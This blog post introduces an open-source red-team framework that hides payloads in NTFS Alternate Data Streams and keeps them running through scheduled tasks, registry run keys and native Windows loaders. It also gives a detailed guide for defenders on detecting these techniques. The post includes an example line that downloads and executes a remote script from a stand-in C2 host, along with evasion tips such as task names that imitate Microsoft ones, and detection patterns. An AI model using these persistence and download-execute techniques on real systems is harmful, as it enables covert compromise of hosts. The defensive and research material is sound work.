---
layout: post
title: "👻 Introducing Apparition Delivery System: An ADS Persistence Framework 👻"
date: 2026-01-21
author: Qweary
categories: [tool, apparition, redteam]
tags: [ads, ntfs, red team, alternate data streams, persistence, windows, ccdc]
permalink: /apparition-introduction.html
---

<pre><code>
██████╗ ██╗    ██╗███████╗ █████╗ ██████╗ ██╗   ██╗
██╔═══██╗██║    ██║██╔════╝██╔══██╗██╔══██╗╚██╗ ██╔╝
██║   ██║██║ █╗ ██║█████╗  ███████║██████╔╝ ╚████╔╝ 
██║▄▄ ██║██║███╗██║██╔══╝  ██╔══██║██╔══██╗  ╚██╔╝  
╚██████╔╝╚███╔███╔╝███████╗██║  ██║██║  ██║   ██║   
 ╚══▀▀═╝  ╚══╝╚══╝ ╚══════╝╚═╝  ╚═╝╚═╝  ╚═╝   ╚═╝   
</code></pre>

---

## Executive Summary

Repository: https://github.com/Qweary/Apparition-Delivery-System

This research began as a small proof-of-concept exploring NTFS Alternate Data Streams (ADS) as a persistence mechanism in CCDC-style environments. Over time, it expanded into a broader investigation of how ADS can be combined with native Windows tooling, modular loaders, and multiple persistence primitives in the hopes of creating resilient persistence techniques.

In other words, I used four different AIs and maxed out all my free tokens for a couple weeks to learn how to use the gadget I found in the way I want (listen, I’m a locksmith, not a powershell and windows internals expert).

The result is a C2-agnostic, modular ADS experimentation framework, implemented primarily in PowerShell and VBScript. The research focuses on:
- Storing arbitrary payloads in NTFS alternate data streams, optionally encrypted
- Executing ADS-resident content via Living-Off-The-Land binaries (LOLBAS)
- Exploring multiple persistence vectors (Scheduled Tasks, Registry, WMI)
- Adapting behavior based on privilege level (user vs. administrator)
- Investigating lesser-documented NTFS features, including volume-root ADS

While individual components have been tested in controlled lab environments, this project has not yet been exercised against live enterprise EDR deployments or production networks. Experimental and unstable techniques are explicitly identified, and several avenues were intentionally abandoned due to reliability or safety concerns.

This post serves as a technical research log: documenting what works, what almost works, and what ultimately proves impractical. The goal was to advance red team tradecraft while providing defenders with concrete detection guidance. 

However, halfway through I realized two things:

1. I was essentially creating a way for malware to hide which abuses the way windows necessarily must behave
2. It was pretty fun, and I only hope this tool gets better

---

## Table of Contents
- Background & Motivation
- Standing on the Shoulders of Giants
- Technical Deep Dive
- Architecture Overview
- ADS Storage Mechanisms
- Execution Chains
- Persistence Methods
- Encryption & Obfuscation
- Novel Techniques
- Development Challenges & Solutions
- Limitations & Validation Status
- Blue Team Detection Guide
- Operational Security Considerations
- Next Actions & Open Research Questions
- Conclusion
- References & Credits

---

## Background & Motivation

### The Problem Space

Personally: I recognized that C2 agent delivery and persistence was my next weakest link in red teaming (see: skill issues). Also, I did a lab on Tryhackme about 1.5 years ago involving Alternate Data Streams, and the very concept of that existing was fascinating to me at the time.

Professionally: Modern endpoint detection platforms are increasingly effective at identifying traditional malware delivery and persistence mechanisms. 

Commonly monitored signals include:
- File creation in well-known directories (C:\Windows\Temp, C:\Users\Public)
- Registry modification in startup locations
- Scheduled task creation with suspicious command lines
- Suspicious parent–child process relationships (e.g., cmd.exe → powershell.exe → network)

NTFS Alternate Data Streams occupy an interesting middle ground. While not invisible to forensic tooling, ADS:
- Are omitted by many default enumeration tools
- Leave fewer obvious artifacts than standalone files
- Can store arbitrary data, including scripts and executables
- Are a native NTFS feature, not a vulnerability or exploit

The goal of this research was not to “rediscover” ADS, but to examine how far they could reasonably be pushed in a modern Windows environment without sacrificing reliability.

### Project Goals

Primarily: Try to make something I thought was original, while also creating my first tool of my own idea.

Also: This research explored several guiding questions:
- Can ADS-based persistence be designed in a C2-agnostic way?
- How much stealth can be gained without destabilizing the host?
- What lesser-known NTFS features are viable in practice?
- How should behavior adapt based on privilege level?
- What does realistic detection look like for defenders?

The motivating constraint was CCDC-style environments, where reliability, speed, and predictability matter more than novelty.

---

## Standing on the Shoulders of Giants

This work builds directly on prior research by the offensive security community. Nothing here exists in a vacuum.

### Core ADS Execution Research

#### Oddvar Moe
Putting Data in Alternate Data Streams and How to Execute It (2018)
Dr. Oddvar Moe’s work demonstrated that ADS execution is not only possible, but flexible, reliable, and surprisingly under-monitored. His documentation of ADODB.Stream usage in VBScript forms the backbone of the execution model used here.

#### Key takeaway: ADS execution via native Windows components is stable and repeatable when implemented conservatively.

---

### ADS Persistence Patterns

#### Matt Nelson (Enigma0x3)
Using Alternate Data Streams to Persist on a Compromised Machine (2015)
Matt Nelson’s combination of ADS storage with Scheduled Tasks remains one of the most practical approaches to ADS persistence. The dual-task model explored later in this post extends this idea with redundancy rather than replacing it.

#### Key takeaway: ADS storage alone is insufficient — persistence primitives still matter.

---

### Evasion & Detection Research

CQURE Academy – ADS detection and evasion patterns

Api0cradle – concise PowerShell ADS manipulation examples

These sources reinforced two recurring themes:
- Randomization matters.
- Legitimate-looking artifacts matter more.

---

### Threat Intelligence

MITRE ATT&CK – T1564.004
Quorum Cyber – APT29 / Midnight Blizzard

ADS usage by real-world threat actors validates the concept, not any specific implementation. Their sophistication informed the separation of storage, loader, and execution stages explored here.

---

## Technical Deep Dive

### Architecture Overview

The framework follows a modular abstraction:
[ Payload ] → [ Storage ] → [ Loader ] → [ Trigger ]

Each stage is intentionally decoupled to allow experimentation without rewriting the entire deployment chain.

#### Design principles:
- Payload agnosticism: Treated as opaque data.
- Composability: Any storage method can pair with any loader.
- Privilege adaptation: Behavior changes based on admin status.
- Failure isolation: One component failing does not cascade.

---

### ADS Storage Mechanisms

#### Standard File ADS

Primary storage uses ADS attached to benign host files under C:\ProgramData. This location was chosen for write accessibility, persistence across reboots, and low operator scrutiny.

Stream naming supports:
- Legitimate Windows stream names
- Randomized identifiers
- Static names for controlled testing
- Payload size is intentionally kept small (<1 MB) to minimize forensic footprint.

---

#### Volume Root ADS (Experimental)

ADS attached directly to the volume root (C:\:streamname) were explored as an alternative storage mechanism.

This feature is supported by NTFS but rarely used legitimately. Initial testing showed consistent behavior on modern Windows versions, but enumeration requires explicit targeting.
This technique is discussed further under Novel Techniques and is treated as experimental.

---

### Execution Chains

Execution favors parent–child chains composed entirely of native binaries.

#### VBScript Loader (Unencrypted Payloads)

VBScript loaders use ADODB.Stream to read ADS content and invoke PowerShell without spawning cmd.exe. Error suppression is used to avoid user-visible artifacts.

This path was favored for simplicity and reduced logging.

---

#### PowerShell Loader (Encrypted Payloads)

When encryption is enabled, PowerShell loaders are generated instead. This decision was driven by practical constraints — VBScript cannot instantiate .NET cryptography primitives.

---

### Persistence Methods

#### Scheduled Tasks

Scheduled Tasks form the primary persistence mechanism, with:
- A logon-triggered task
- A periodic “resilience” task
- Task names and paths are designed to resemble legitimate Windows components.

---

#### Registry Run Keys

Used as a fallback when task creation is unavailable. This method is reliable but highly monitored and treated accordingly.

---

## Encryption & Obfuscation

AES-256 encryption is supported using a deterministic, per-host key derived from system properties. The goal is not secrecy from a live operator, but resistance to static analysis.

This approach avoids key storage while ensuring repeatable decryption on the same host.

Unless you’re using the VBScript method, then no AES for you ‘cause VBScript can’t do it.

---

## Novel Techniques

### Volume Root ADS

Volume-root ADS survive directory deletion and evade many common enumeration workflows. 
However:
- They require administrative privileges
- Behavior is under-documented
- Enumeration requires explicit targeting

As such, they are treated as experimental and not default behavior.

---

### NTFS Metadata Streams ($LOGGED_UTILITY_STREAM)

Exploration of $LOGGED_UTILITY_STREAM was conducted purely as research. While theoretically attractive, practical testing revealed:
- Filesystem corruption risk
- Inconsistent behavior across OS versions
- Increased EDR scrutiny

This technique was intentionally excluded from tooling.

#### Lesson: Novelty does not outweigh stability.

---

## Development Challenges & Solutions

Key lessons include:
VBScript’s inability to interact with .NET crypto
PowerShell function serialization limitations
Payload escaping pitfalls
Hashtable syntax constraints
Each issue directly shaped design decisions.

### Challenge 1: VBScript Cannot Decrypt AES

#### Problem: Initial design used VBScript for all loaders. When implementing encryption, I hit this roadblock:

Set aes = CreateObject("System.Security.Cryptography.AesManaged")
' Runtime error: ActiveX component can't create object

VBScript cannot instantiate .NET objects directly—it needs COM wrappers, which AES classes don't have.

#### Solution: Conditional loader selection:

Unencrypted payloads → VBScript loader (stealthier, no PowerShell ScriptBlock logging)
Encrypted payloads → PowerShell loader (native .NET crypto support)
function New-Loader($ADSPath, $Config) {
    if($Encrypt) {
        Write-Warning "AES detected → Using PowerShell loader"
        return New-PSLoader $ADSPath $Config
    }
    # VBScript for non-encrypted
}

#### Lesson: Always prototype with target execution environment constraints in mind.

---

### Challenge 2: Remote Function Serialization

#### Problem: Invoke-Command doesn't automatically serialize local functions to remote sessions. This failed:

Invoke-Command -ComputerName $target -ScriptBlock {
    Get-RandomADSConfig  # Error: The term 'Get-RandomADSConfig' is not recognized
}

#### Solution: Serialize functions as strings and inject them into the remote scriptblock:

$allFunctions = @(
    "function Get-RandomADSConfig { $( ${function:Get-RandomADSConfig}.ToString() ) }",
    "function ConvertTo-PSPayload { $( ${function:ConvertTo-PSPayload}.ToString() ) }",
    # ... all 7 functions
) -join "`n`n"

$remoteBlock = [scriptblock]::Create(@"

# Load all functions

$allFunctions

# Execute deployment logic

`$cfg = Get-RandomADSConfig
...
"@)

Invoke-Command -ComputerName $target -ScriptBlock $remoteBlock

#### Lesson: PowerShell's .ToString() method on scriptblocks is incredibly powerful for building dynamic remote execution.

---

### Challenge 3: Payload Escaping for Remote Execution

#### Problem: Passing payloads containing single quotes broke remote execution:

$payload = "IEX (New-Object Net.WebClient).DownloadString('http://c2/payload.ps1')"

# In remote scriptblock:

`$rawPayload = ConvertTo-PSPayload '$payload'

# Result: Syntax error (unmatched quotes)


**Solution:** Escape single quotes before embedding:

```powershell
$payloadEscaped = $PayloadObj -replace "'","''"

$remoteBlock = [scriptblock]::Create(@"
`$rawPayload = ConvertTo-PSPayload '$payloadEscaped'
"@)
```
Now ' becomes '' (PowerShell escape sequence), preserving the payload.

#### Lesson: Always sanitize user input/data before injecting into scriptblocks or here-strings.

---

## Blue Team Detection Guide

ADS abuse remains detectable with:
- Sysmon Event ID 15
- Scheduled task creation monitoring
- Explicit ADS enumeration
- Behavioral analysis of script hosts

Defenders should baseline legitimate ADS usage and treat volume-root streams with skepticism. As red teamers, our responsibility includes empowering defenders. 

Unfortunately, I am a locksmith and not an expert on blue team event monitoring. What I can do, however, is use an llm for help using the context of what I created and what my intentions were while creating it.

Here's how to detect ADS-Dropper and similar techniques (according to Claude):

### Detection Method 1: Sysmon Configuration

#### Enable FileCreateStreamHash (Event ID 15):

<Sysmon schemaversion="4.82">
  <EventFiltering>
    <FileCreateStreamHash onmatch="include">
      <TargetFilename condition="contains">ProgramData</TargetFilename>
      <TargetFilename condition="contains">Temp</TargetFilename>
    </FileCreateStreamHash>
  </EventFiltering>
</Sysmon>

#### What This Detects:

Any ADS creation in C:\ProgramData or C:\Temp
Logs: Filename, stream name, SHA256 hash of stream content

#### Example Log:

Event ID: 15
UtcTime: 2025-01-21 14:23:45.123
ProcessGuid: {12345678-1234-1234-1234-1234567890AB}
ProcessId: 4567
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\ProgramData\SystemCache.dat:syc_payload
Hash: SHA256=A3F5B2...

#### Response: Investigate the hash. If it's Base64-encoded or contains PowerShell/C2 patterns, quarantine immediately.

---

### Detection Method 2: Scheduled Task Monitoring

#### Watch Event ID 4698 (Task Created):

 Query Security log for recent task creation
Get-WinEvent -LogName Security | Where-Object {
    $_.Id -eq 4698 -and 
    $_.TimeCreated -gt (Get-Date).AddHours(-24)
} | ForEach-Object {
    $xml = [xml]$_.ToXml()
    $taskName = $xml.Event.EventData.Data | Where-Object {$_.Name -eq 'TaskName'} | Select-Object -ExpandProperty '#text'
    $actionContent = $xml.Event.EventData.Data | Where-Object {$_.Name -eq 'TaskContent'} | Select-Object -ExpandProperty '#text'
    
    if($actionContent -match 'wscript.*//B|powershell.*Hidden.*Command.*Get-Content.*Invoke-Expression') {
        Write-Warning "Suspicious task: $taskName"
        Write-Host $actionContent
    }
}

#### Indicators:

Task name mimics Microsoft paths: \Microsoft\Windows\UX\*, \Microsoft\Windows\Maintenance\WinSAT_*
Action contains: wscript.exe //B, powershell.exe -WindowStyle Hidden -Command "Get-Content 'C:\:*'"
Run Level: SYSTEM (rl highest)

---

### Detection Method 3: ADS Enumeration

#### PowerShell ADS Scanner:

function Find-SuspiciousADS {
    param([string[]]$Paths = @('C:\ProgramData', 'C:\Windows\Temp', 'C:\Users'))
    
    foreach($path in $Paths) {
        Get-ChildItem $path -Recurse -File -ErrorAction SilentlyContinue | 
            Get-Item -Stream * -ErrorAction SilentlyContinue | 
            Where-Object { 
                $_.Stream -ne ':$DATA' -and  # Exclude primary stream
                $_.Length -gt 0 -and         # Exclude empty streams
                $_.Stream -notmatch '^Zone\.Identifier$'  # Exclude legit Windows stream
            } | ForEach-Object {
                $content = Get-Content $_.PSPath -Raw -ErrorAction SilentlyContinue
                
                # Check for Base64 (encrypted payload indicator)
                $isBase64 = $content -match '^[A-Za-z0-9+/=]{50,}$'
                
                # Check for PowerShell patterns
                $hasPowerShell = $content -match '(IEX|Invoke-Expression|New-Object|DownloadString|WebClient)'
                
                [PSCustomObject]@{
                    Path = $_.PSPath
                    Stream = $_.Stream
                    Size = $_.Length
                    IsBase64 = $isBase64
                    HasPowerShell = $hasPowerShell
                    FirstBytes = $content.Substring(0, [Math]::Min(100, $content.Length))
                }
            }
    }
}

# Run scan

Find-SuspiciousADS | Format-Table -Auto

#### Output Example:

Path                                              Stream       Size IsBase64 HasPowerShell FirstBytes

C:\ProgramData\SystemCache.dat:syc_payload         syc_payload  1024 True     False         VGhpcyBpcyBteSBJTX14IHN0Y...
C:\ProgramData\CacheSvc.log:Zone.Identifier        SmartScreen   512 False    True          IEX (New-Object Net.WebCli...

---

### Detection Method 4: Behavioral Analytics

#### SIEM Query (Splunk Example):

index=windows sourcetype=WinEventLog:Sysmon EventCode=1
| where (Image="*\\wscript.exe" OR Image="*\\cscript.exe")
  AND (CommandLine="*//B*" OR CommandLine="*//Nologo*")
| stats count by Computer, ParentImage, CommandLine
| where count > 5

#### What This Finds:

Frequent wscript.exe executions with silent flags (//B)
Unusual parent processes (scheduled tasks vs. user-initiated)

#### Threshold Tuning: Adjust count > 5 based on environment (corporate vs. lab).

---

### Detection Method 5: Forensic Indicators

#### Disk Forensics (FTK Imager, Autopsy):

MFT Analysis: NTFS Master File Table records all streams. Look for:


Filenames with multiple $DATA attributes
$LOGGED_UTILITY_STREAM references (extremely rare legitimately)
Timeline Analysis: Correlate ADS creation timestamps with:


Scheduled task creation (Event 4698)
Network connections (Event 5156 - Firewall permit)
Process creation (Event 4688 or Sysmon Event 1)
Volume Shadow Copy Comparison:


VSS preserves ADS. Compare current filesystem with previous VSS to find new ADS.

#### Tools:

Streams.exe (Sysinternals): streams.exe -s C:\ProgramData
LADS (List Alternate Data Streams): lads.exe C:\ProgramData
PowerShell: Get-Item C:\ProgramData\* -Stream *

---

## Operational Security Considerations

### What Worked Well

- No custom binaries
- Aggressive randomization
- Graceful fallback behavior

### Areas for Improvement

- AMSI interaction
- ETW visibility
- Cleanup automation
- 
These are acknowledged gaps, not oversights.

---

## Next Actions & Open Research Questions

Several clear next steps remain:

### 1. Operational Validation

Future work will focus on testing against modern enterprise EDR deployments, measuring detection latency rather than binary outcomes.

### 2. Usability & Documentation

The current tooling lacks a dedicated help system. Planned improvements include:
- Structured help output
- Usage examples
- Explicit warnings for experimental features

### 3. Stream Name Semantics & Stealth

During development, a stream-naming approach was identified that appears to significantly reduce suspicion during enumeration.

This goes beyond simple randomization or reuse of known stream names and instead leverages how stream semantics are interpreted by tooling.

This concept will be explored and validated in a follow-up post.

If it holds up, it meaningfully changes how ADS should be named — not just how they are hidden.

### 4. Cleanup & Lifecycle Management

Responsible persistence includes responsible removal. Cleanup automation is a planned addition.

---

## Limitations & Validation Status

This project reflects ongoing research, not finished operational tradecraft.
Testing has been limited to controlled lab environments
No live enterprise EDR testing has been performed
Long-term survivability after remediation has not been measured
These constraints define the current boundary of the work and motivate future research.

---

## Conclusion

NTFS Alternate Data Streams remain a viable (but for whatever reason, rarely discussed) persistence mechanism when used carefully and conservatively.

This research reinforces several themes:
- Reliability matters more than cleverness
- Native tooling still offers room for abuse
- Detection is improving, but uneven
- Documenting failures is as important as documenting success
- I still have SO much to learn

ADS should not be treated as a silver bullet, but as one component in a layered approach.

---

## Acknowledgments

This work builds on research by Oddvar Moe, Enigma0x3, Api0cradle, CQURE Academy, MITRE ATT&CK, and others.

Thanks to CCDC teammates for motivation and testing, and to the broader PowerShell community for making experimentation possible.

---

## References & Credits

### Primary Research Sources

Oddvar Moe, "Putting Data in Alternate Data Streams and How to Execute It", January 2018.
 https://oddvar.moe/2018/01/14/putting-data-in-alternate-data-streams-and-how-to-execute-it/


Oddvar Moe, "Putting Data in Alternate Data Streams and How to Execute It - Part 2", April 2018.
 https://oddvar.moe/2018/04/11/putting-data-in-alternate-data-streams-and-how-to-execute-it-part-2/


Matt Nelson (Enigma0x3), "Using Alternate Data Streams to Persist on a Compromised Machine", March 2015.
 https://enigma0x3.net/2015/03/05/using-alternate-data-streams-to-persist-on-a-compromised-machine/


Enigma0x3, "Invoke-ADSBackdoor.ps1", GitHub Repository.
 https://github.com/enigma0x3/Invoke-AltDSBackdoor/blob/master/Invoke-ADSBackdoor.ps1


CQURE Academy, "Alternate Data Streams", Blog Post.
 https://cqureacademy.com/blog/alternate-data-streams/


Api0cradle, "ADS Manipulation Snippets", GitHub Gist.
 https://gist.github.com/api0cradle/cdd2d0d0ec9abb686f0e89306e277b8f


MITRE Corporation, "T1564.004: Hide Artifacts - NTFS File Attributes", ATT&CK Framework.
 https://attack.mitre.org/techniques/T1564/004/


Quorum Cyber, "Midnight Blizzard (APT29) Threat Actor Profile", September 2023.
 https://www.quorumcyber.com/wp-content/uploads/2023/09/Quorum-Cyber-Midnight-Blizzard-APT29-Threat-Actor-Profile.pdf


### Technical Documentation

Microsoft, "NTFS Overview", Windows Dev Center.
 https://docs.microsoft.com/en-us/windows-server/storage/file-server/ntfs-overview


Microsoft, "File Streams", Win32 API Documentation.
 https://docs.microsoft.com/en-us/windows/win32/fileio/file-streams


Mark Russinovich, "Streams.exe", Sysinternals Suite.
 https://docs.microsoft.com/en-us/sysinternals/downloads/streams


### Tools Used

PowerShell 5.1 / 7.x - Scripting framework
Sysmon 15.0 - System monitoring
Windows 11 22H2 / Server 2022 - Testing environments
Visual Studio Code - Development IDE
VirtualBox / Hyper-V - Virtualization platforms

---

## Disclaimer

This research is published for educational and defensive purposes only. The techniques described are intended for:
Authorized penetration testing with written permission
CCDC and similar competitive cybersecurity exercises
Security research in isolated laboratory environments
Blue team training and detection development

### FAFO warnings:

Unauthorized use of these techniques against systems you do not own or have explicit permission to test is illegal and unethical.
The author assumes no liability for misuse of this information. By reading this document, you agree to use the knowledge responsibly and in accordance with applicable laws.
